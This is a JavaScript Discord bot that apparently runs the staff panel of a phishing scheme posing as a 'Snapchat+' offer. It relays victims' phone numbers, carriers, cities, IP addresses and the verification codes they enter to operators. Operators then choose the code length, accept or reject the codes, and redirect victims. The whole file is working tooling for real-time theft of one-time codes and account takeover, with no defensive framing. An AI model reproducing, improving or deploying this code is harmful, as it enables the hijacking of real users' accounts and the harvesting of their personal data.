import 'dotenv/config';
import { Client, GatewayIntentBits, EmbedBuilder, ActionRowBuilder, ButtonBuilder, ButtonStyle, SlashCommandBuilder, REST, Routes } from 'discord.js';
import { neon } from '@neondatabase/serverless';

const TOKEN = process.env.DISCORD_BOT_TOKEN;
const CLIENT_ID = process.env.DISCORD_CLIENT_ID;
const GUILD_ID = process.env.DISCORD_GUILD_ID;
const LOG_CHANNEL_ID = process.env.DISCORD_LOG_CHANNEL_ID;
const DATABASE_URL = process.env.DATABASE_URL;
const STAFF_SECRET = process.env.STAFF_SECRET;
const API_BASE = process.env.API_BASE || 'https://snaptech.vercel.app';

if (!TOKEN || !CLIENT_ID || !DATABASE_URL) {
    console.error('❌ Variables manquantes : DISCORD_BOT_TOKEN, DISCORD_CLIENT_ID, DATABASE_URL');
    process.exit(1);
}

const sql = neon(DATABASE_URL);
const client = new Client({
    intents: [
        GatewayIntentBits.Guilds,
        GatewayIntentBits.GuildMessages,
        GatewayIntentBits.MessageContent
    ]
});

// ─── COMMANDES SLASH ───
const commands = [
    new SlashCommandBuilder().setName('config').setDescription('Configurer le salon de logs')
        .addChannelOption(opt => opt.setName('salon').setDescription('Salon Discord').setRequired(true)),
    new SlashCommandBuilder().setName('panel').setDescription('Afficher le panel staff'),
    new SlashCommandBuilder().setName('claim').setDescription('Prendre en charge une demande')
        .addStringOption(opt => opt.setName('phone').setDescription('Numéro').setRequired(true)),
    new SlashCommandBuilder().setName('setlength').setDescription('Définir la longueur du code')
        .addStringOption(opt => opt.setName('phone').setDescription('Numéro').setRequired(true))
        .addIntegerOption(opt => opt.setName('length').setDescription('4 ou 6').setRequired(true)),
    new SlashCommandBuilder().setName('wrongnumber').setDescription('Signaler wrong number')
        .addStringOption(opt => opt.setName('phone').setDescription('Numéro').setRequired(true)),
    new SlashCommandBuilder().setName('banip').setDescription('Bannir une IP')
        .addStringOption(opt => opt.setName('ip').setDescription('Adresse IP').setRequired(true))
];

const rest = new REST({ version: '10' }).setToken(TOKEN);
(async () => {
    try {
        console.log('🔄 Déploiement des commandes slash...');
        await rest.put(
            GUILD_ID ? Routes.applicationGuildCommands(CLIENT_ID, GUILD_ID) : Routes.applicationCommands(CLIENT_ID),
            { body: commands.map(c => c.toJSON()) }
        );
        console.log('✅ Commandes déployées');
    } catch (e) {
        console.error('Erreur déploiement commands:', e);
    }
})();

// ─── READY ───
client.once('ready', () => {
    console.log(`🤖 Bot connecté : ${client.user.tag}`);
    console.log(`📡 API: ${API_BASE}`);
    console.log(`📝 Salon: ${LOG_CHANNEL_ID || 'Non configuré'}`);
    startPollingPending();
    startPollingCodeSubmitted();
});

// ─── POLLING 1 : nouvelles demandes PENDING ───
let lastPendingId = 0;

async function startPollingPending() {
    setInterval(async () => {
        try {
            const rows = await sql`
                SELECT id, username, phone, operator, country, city, ip_address, status, created_at
                FROM snap_requests
                WHERE id > ${lastPendingId} AND status = 'pending'
                ORDER BY id ASC
            `;
            for (const row of rows) {
                lastPendingId = Math.max(lastPendingId, row.id);
                await sendNewRequestEmbed(row);
            }
        } catch (e) {
            console.error('Polling pending error:', e.message || e);
        }
    }, 5000);
}

// ─── POLLING 2 : demandes CODE_SUBMITTED (code saisi par l'utilisateur) ───
let lastCodeSubmittedId = 0;

async function startPollingCodeSubmitted() {
    setInterval(async () => {
        try {
            const rows = await sql`
                SELECT id, username, phone, operator, country, city, ip_address, staff_code, code_length, status, created_at
                FROM snap_requests
                WHERE id > ${lastCodeSubmittedId} AND status = 'code_submitted' AND staff_code IS NOT NULL
                ORDER BY id ASC
            `;
            for (const row of rows) {
                lastCodeSubmittedId = Math.max(lastCodeSubmittedId, row.id);
                await sendCodeSubmittedEmbed(row);
            }
        } catch (e) {
            console.error('Polling code_submitted error:', e.message || e);
        }
    }, 5000);
}

// ─── Embed nouvelle demande ───
async function sendNewRequestEmbed(row) {
    const channel = client.channels.cache.get(LOG_CHANNEL_ID);
    if (!channel) { console.log('⚠️ Salon non trouvé'); return; }

    const carrierNames = {
        'orange': 'Orange', 'sfr': 'SFR', 'bouygues': 'Bouygues',
        'base': 'BASE', 'orange_be': 'Orange Belgique', 'proximus': 'Proximus', 'telenet': 'Telenet'
    };

    const embed = new EmbedBuilder()
        .setTitle('📱 Nouvelle demande Snapchat+')
        .setColor(0xfffc00)
        .addFields(
            { name: '👤 Username', value: row.username, inline: true },
            { name: '📞 Téléphone', value: row.phone, inline: true },
            { name: '📡 Opérateur', value: carrierNames[row.operator] || row.operator, inline: true },
            { name: '🌍 Pays', value: row.country || 'Inconnu', inline: true },
            { name: '🏙️ Ville', value: row.city || 'Inconnue', inline: true },
            { name: '🌐 IP', value: row.ip_address || 'Inconnue', inline: true },
            { name: '⏰ Date', value: `<t:${Math.floor(new Date(row.created_at).getTime()/1000)}:R>`, inline: false }
        )
        .setFooter({ text: `ID: ${row.id}` })
        .setTimestamp();

    const rowButtons = new ActionRowBuilder().addComponents(
        new ButtonBuilder().setCustomId(`claim_${row.phone}`).setLabel('📋 Prendre en charge').setStyle(ButtonStyle.Primary)
    );

    await channel.send({ embeds: [embed], components: [rowButtons] });
    console.log(`📨 Nouvelle demande : ${row.phone}`);
}

// ─── Embed CODE SAISI (True / False / Ban) ───
async function sendCodeSubmittedEmbed(row) {
    const channel = client.channels.cache.get(LOG_CHANNEL_ID);
    if (!channel) return;

    const carrierNames = {
        'orange': 'Orange', 'sfr': 'SFR', 'bouygues': 'Bouygues',
        'base': 'BASE', 'orange_be': 'Orange Belgique', 'proximus': 'Proximus', 'telenet': 'Telenet'
    };

    const embed = new EmbedBuilder()
        .setTitle('🔓 Code saisi par l\'utilisateur')
        .setColor(0x10b981)
        .setDescription(`Le client a saisi un code à **${row.code_length || 6} chiffres**. Veuillez le vérifier.`)
        .addFields(
            { name: '👤 Username', value: row.username, inline: true },
            { name: '📞 Téléphone', value: row.phone, inline: true },
            { name: '🔢 Code', value: `||${row.staff_code}||`, inline: true },
            { name: '📡 Opérateur', value: carrierNames[row.operator] || row.operator, inline: true },
            { name: '🌍 Pays', value: row.country || 'Inconnu', inline: true },
            { name: '🏙️ Ville', value: row.city || 'Inconnue', inline: true },
            { name: '🌐 IP', value: row.ip_address || 'Inconnue', inline: true }
        )
        .setFooter({ text: `ID: ${row.id}` })
        .setTimestamp();

    const actionRow = new ActionRowBuilder().addComponents(
        new ButtonBuilder().setCustomId(`truecode_${row.phone}`).setLabel('✅ True Code').setStyle(ButtonStyle.Success),
        new ButtonBuilder().setCustomId(`falsecode_${row.phone}`).setLabel('❌ False Code').setStyle(ButtonStyle.Danger),
        new ButtonBuilder().setCustomId(`banip_${row.ip_address}`).setLabel('🚫 Ban IP').setStyle(ButtonStyle.Secondary)
    );

    await channel.send({ embeds: [embed], components: [actionRow] });
    console.log(`🔓 Code saisi : ${row.phone} — Code: ${row.staff_code}`);
}

// ─── INTERACTIONS BOUTONS ───
client.on('interactionCreate', async interaction => {
    if (!interaction.isButton()) return;

    const [action, phone] = interaction.customId.split('_');

    // ─── CLAIM ───
    if (action === 'claim') {
        await interaction.deferReply({ flags: 64 });
        try {
            const res = await fetch(`${API_BASE}/api/staff-action`, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ action: 'claim', phone, secret: STAFF_SECRET })
            });
            const data = await res.json();

            if (data.success) {
                await interaction.editReply({ content: `✅ Demande **${phone}** prise en charge par <@${interaction.user.id}>` });

                const newEmbed = EmbedBuilder.from(interaction.message.embeds[0])
                    .setColor(0x3b82f6)
                    .setTitle('📱 Demande en cours de traitement')
                    .setDescription(`👤 Pris en charge par <@${interaction.user.id}>\n\nChoisissez l'action :`);

                const actionRow = new ActionRowBuilder().addComponents(
                    new ButtonBuilder().setCustomId(`len4_${phone}`).setLabel('🔢 4 chiffres').setStyle(ButtonStyle.Success),
                    new ButtonBuilder().setCustomId(`len6_${phone}`).setLabel('🔢 6 chiffres').setStyle(ButtonStyle.Success),
                    new ButtonBuilder().setCustomId(`wrong_${phone}`).setLabel('❌ Wrong Number').setStyle(ButtonStyle.Danger)
                );

                await interaction.message.edit({ embeds: [newEmbed], components: [actionRow] });
            } else {
                await interaction.editReply({ content: `❌ ${data.message}` });
            }
        } catch (e) {
            await interaction.editReply({ content: '❌ Erreur réseau' });
        }
    }

    // ─── 4 CHIFFRES ───
    if (action === 'len4') {
        await interaction.deferReply({ flags: 64 });
        try {
            const res = await fetch(`${API_BASE}/api/staff-action`, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ action: 'set_length', phone, length: 4, secret: STAFF_SECRET })
            });
            const data = await res.json();
            await interaction.editReply({ content: data.success ? `✅ Code à 4 chiffres demandé pour ${phone}` : `❌ ${data.message}` });
            if (data.success) {
                const doneEmbed = EmbedBuilder.from(interaction.message.embeds[0])
                    .setColor(0xf59e0b)
                    .setTitle('📱 En attente du code (4 chiffres)')
                    .setDescription(`👤 Pris en charge\n🔢 Code demandé : **4 chiffres**`);
                await interaction.message.edit({ embeds: [doneEmbed], components: [] });
            }
        } catch (e) { await interaction.editReply({ content: '❌ Erreur' }); }
    }

    // ─── 6 CHIFFRES ───
    if (action === 'len6') {
        await interaction.deferReply({ flags: 64 });
        try {
            const res = await fetch(`${API_BASE}/api/staff-action`, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ action: 'set_length', phone, length: 6, secret: STAFF_SECRET })
            });
            const data = await res.json();
            await interaction.editReply({ content: data.success ? `✅ Code à 6 chiffres demandé pour ${phone}` : `❌ ${data.message}` });
            if (data.success) {
                const doneEmbed = EmbedBuilder.from(interaction.message.embeds[0])
                    .setColor(0xf59e0b)
                    .setTitle('📱 En attente du code (6 chiffres)')
                    .setDescription(`👤 Pris en charge\n🔢 Code demandé : **6 chiffres**`);
                await interaction.message.edit({ embeds: [doneEmbed], components: [] });
            }
        } catch (e) { await interaction.editReply({ content: '❌ Erreur' }); }
    }

    // ─── WRONG NUMBER ───
    if (action === 'wrong') {
        await interaction.deferReply({ flags: 64 });
        try {
            const res = await fetch(`${API_BASE}/api/staff-action`, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ action: 'wrong_number', phone, secret: STAFF_SECRET })
            });
            const data = await res.json();
            await interaction.editReply({ content: data.success ? `✅ Wrong number signalé pour ${phone}` : `❌ ${data.message}` });
            if (data.success) {
                const doneEmbed = EmbedBuilder.from(interaction.message.embeds[0])
                    .setColor(0xef4444)
                    .setTitle('📱 Wrong Number')
                    .setDescription(`❌ L'utilisateur a été redirigé vers la saisie du numéro.`);
                await interaction.message.edit({ embeds: [doneEmbed], components: [] });
            }
        } catch (e) { await interaction.editReply({ content: '❌ Erreur' }); }
    }

    // ─── TRUE CODE (valide le code) ───
    if (action === 'truecode') {
        await interaction.deferReply({ flags: 64 });
        try {
            const res = await fetch(`${API_BASE}/api/staff-action`, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ action: 'true_code', phone, secret: STAFF_SECRET })
            });
            const data = await res.json();
            await interaction.editReply({ content: data.success ? `✅ Code validé pour ${phone}` : `❌ ${data.message}` });
            if (data.success) {
                const doneEmbed = EmbedBuilder.from(interaction.message.embeds[0])
                    .setColor(0x10b981)
                    .setTitle('✅ Code validé')
                    .setDescription(`👤 Validé par <@${interaction.user.id}>\nL'utilisateur est redirigé vers la page de félicitations.`);
                await interaction.message.edit({ embeds: [doneEmbed], components: [] });
            }
        } catch (e) { await interaction.editReply({ content: '❌ Erreur' }); }
    }

    // ─── FALSE CODE (code incorrect, l'utilisateur doit ressaisir) ───
    if (action === 'falsecode') {
        await interaction.deferReply({ flags: 64 });
        try {
            const res = await fetch(`${API_BASE}/api/staff-action`, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ action: 'false_code', phone, secret: STAFF_SECRET })
            });
            const data = await res.json();
            await interaction.editReply({ content: data.success ? `❌ Code refusé pour ${phone}. L'utilisateur doit ressaisir.` : `❌ ${data.message}` });
            if (data.success) {
                // Remettre l'embed "Demande en cours" avec les 3 boutons
                const newEmbed = EmbedBuilder.from(interaction.message.embeds[0])
                    .setColor(0x3b82f6)
                    .setTitle('📱 Demande en cours de traitement')
                    .setDescription(`👤 Pris en charge\n❌ Le code précédent était incorrect.\n\nChoisissez la nouvelle action :`);

                const actionRow = new ActionRowBuilder().addComponents(
                    new ButtonBuilder().setCustomId(`len4_${phone}`).setLabel('🔢 4 chiffres').setStyle(ButtonStyle.Success),
                    new ButtonBuilder().setCustomId(`len6_${phone}`).setLabel('🔢 6 chiffres').setStyle(ButtonStyle.Success),
                    new ButtonBuilder().setCustomId(`wrong_${phone}`).setLabel('❌ Wrong Number').setStyle(ButtonStyle.Danger)
                );

                await interaction.message.edit({ embeds: [newEmbed], components: [actionRow] });
            }
        } catch (e) { await interaction.editReply({ content: '❌ Erreur' }); }
    }

    // ─── BAN IP ───
    if (action === 'banip') {
        await interaction.deferReply({ flags: 64 });
        const ip = phone;
        try {
            const res = await fetch(`${API_BASE}/api/ban-ip`, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ ip, secret: STAFF_SECRET, banned_by: interaction.user.tag })
            });
            const data = await res.json();
            await interaction.editReply({ content: data.success ? `🚫 IP **${ip}** bannie avec succès !` : `❌ ${data.message}` });
            if (data.success) {
                const bannedEmbed = EmbedBuilder.from(interaction.message.embeds[0])
                    .setColor(0xef4444)
                    .setTitle('🔨 IP Bannie')
                    .setDescription(`🚫 IP **${ip}** bannie par <@${interaction.user.id}>`);
                await interaction.message.edit({ embeds: [bannedEmbed], components: [] });
            }
        } catch (e) { await interaction.editReply({ content: '❌ Erreur réseau' }); }
    }
});

// ─── COMMANDES SLASH ───
client.on('interactionCreate', async interaction => {
    if (!interaction.isChatInputCommand()) return;

    if (interaction.commandName === 'config') {
        const salon = interaction.options.getChannel('salon');
        process.env.DISCORD_LOG_CHANNEL_ID = salon.id;
        await interaction.reply({ content: `✅ Salon configuré : <#${salon.id}>`, flags: 64 });
    }

    if (interaction.commandName === 'panel') {
        const embed = new EmbedBuilder().setTitle('🎛️ Panel Staff').setDescription('Les demandes apparaissent ici.').setColor(0x000000);
        await interaction.reply({ embeds: [embed] });
    }

    if (interaction.commandName === 'claim') {
        const phone = interaction.options.getString('phone');
        await interaction.deferReply();
        try {
            const res = await fetch(`${API_BASE}/api/staff-action`, {
                method: 'POST', headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ action: 'claim', phone, secret: STAFF_SECRET })
            });
            const data = await res.json();
            await interaction.editReply({ content: data.success ? `✅ ${data.message}` : `❌ ${data.message}` });
        } catch (e) { await interaction.editReply({ content: '❌ Erreur' }); }
    }

    if (interaction.commandName === 'setlength') {
        const phone = interaction.options.getString('phone');
        const length = interaction.options.getInteger('length');
        await interaction.deferReply();
        try {
            const res = await fetch(`${API_BASE}/api/staff-action`, {
                method: 'POST', headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ action: 'set_length', phone, length, secret: STAFF_SECRET })
            });
            const data = await res.json();
            await interaction.editReply({ content: data.success ? `✅ ${data.message}` : `❌ ${data.message}` });
        } catch (e) { await interaction.editReply({ content: '❌ Erreur' }); }
    }

    if (interaction.commandName === 'wrongnumber') {
        const phone = interaction.options.getString('phone');
        await interaction.deferReply();
        try {
            const res = await fetch(`${API_BASE}/api/staff-action`, {
                method: 'POST', headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ action: 'wrong_number', phone, secret: STAFF_SECRET })
            });
            const data = await res.json();
            await interaction.editReply({ content: data.success ? `✅ ${data.message}` : `❌ ${data.message}` });
        } catch (e) { await interaction.editReply({ content: '❌ Erreur' }); }
    }

    if (interaction.commandName === 'banip') {
        const ip = interaction.options.getString('ip');
        await interaction.deferReply();
        try {
            const res = await fetch(`${API_BASE}/api/ban-ip`, {
                method: 'POST', headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ ip, secret: STAFF_SECRET, banned_by: interaction.user.tag })
            });
            const data = await res.json();
            await interaction.editReply({ content: data.success ? `🚫 ${data.message}` : `❌ ${data.message}` });
        } catch (e) { await interaction.editReply({ content: '❌ Erreur' }); }
    }
});

client.login(TOKEN);
